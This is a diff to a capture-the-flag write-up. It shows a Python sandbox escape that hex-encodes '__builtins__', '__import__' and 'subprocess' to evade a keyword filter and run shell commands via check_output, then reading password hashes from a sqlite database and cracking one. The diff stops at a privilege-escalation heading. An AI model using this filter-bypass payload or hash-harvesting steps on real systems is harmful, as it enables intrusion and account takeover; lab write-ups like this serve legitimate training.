@@ -113,4 +113,54 @@ Popen
 
 ![image](https://github.com/user-attachments/assets/6a3d812e-e4a5-454d-8fed-e210372ac401)
 
-- It is a list,we can call a class based on its index value.Index `100` allows me to access `__init__`.
+- It is a list,we can call a class based on its index value.The class at index `100` allows me to access `__builtins__`.Now,we can access `import` and call subprocess.
+
+![image](https://github.com/user-attachments/assets/9e0f3165-fe5c-40e7-b156-a1ffaeff123a)
+
+- I used check_output to execute a shell command because the common ones `Popen` and `call` are being filtered.
+
+![image](https://github.com/user-attachments/assets/23a94274-d026-4d40-b637-2e0eef9dab56)
+
+- Full Poc-:
+
+```python3
+x = bytes.fromhex("5f5f6275696c74696e735f5f").decode()
+y = bytes.fromhex("5f5f696d706f72745f5f").decode()
+z = bytes.fromhex("73756270726f63657373").decode()
+print(x.__class__.__base__.__subclasses__()[100].__init__.__globals__[x][y](z).check_output('ls',shell=True,text=False))
+```
+
+- Revshell as user `app`-:
+
+![image](https://github.com/user-attachments/assets/fde54fa1-72d4-4f94-9453-7d97d5bfd76d)
+
+----------------
+
+### User Martin
+
+-----------------
+
+- I went through the backend of the code editor app, I noticed it runs on a sqlite db.
+
+![image](https://github.com/user-attachments/assets/08a0ef92-7c04-4bf5-a3e2-1a3f72f653bb)
+
+- I opened it with the `sqlite3` commandline and discovered hashes in the table `user` for user `developer` and `martin`.
+
+![image](https://github.com/user-attachments/assets/5fb913e7-2864-401b-b149-7a4ddb5924fc)
+
+- I cracked Martin's hash with crackstation.net.
+
+![image](https://github.com/user-attachments/assets/068b5774-c5fe-4ab1-9ed0-b18c22af4a4b)
+
+- User Martin-:
+
+![image](https://github.com/user-attachments/assets/85a21af4-9395-47b2-9cea-159eedd15603)
+
+----------------
+
+### PRIVILEGE ESCALATION- :BACKY GO TOOL ARBITRARY FILE WRITE
+
+----------------
+
+
+
